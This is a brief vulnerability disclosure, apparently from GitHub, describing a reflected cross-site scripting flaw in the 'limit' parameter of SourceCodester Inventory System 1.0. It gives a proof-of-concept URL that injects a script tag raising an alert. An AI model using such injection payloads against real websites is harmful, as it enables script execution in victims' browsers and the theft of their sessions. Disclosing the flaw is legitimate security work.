# Reflected XSS in Inventory System (View Stock Availability)
...
* **Version**: 1.0
* **Component**: View Stock Availability (`view_stock_availability.php`)
* **Vulnerable Parameter**: `limit` (GET)

## Description

A Reflected Cross-Site Scripting (XSS) vulnerability exists in **SourceCodester Inventory System 1.0**. The vulnerability is located in the `view_stock_availability.php` file.
...
```
http://127.0.0.1:8089/view_stock_availability.php?limit=%22%3E%3Cscript%3Ealert(15623);%3C/script%3E
...
<img width="1029" height="693" alt="图片" src="https://github.com/user-attachments/assets/69d42baf-daf5-471b-900e-e733630b43e0" />
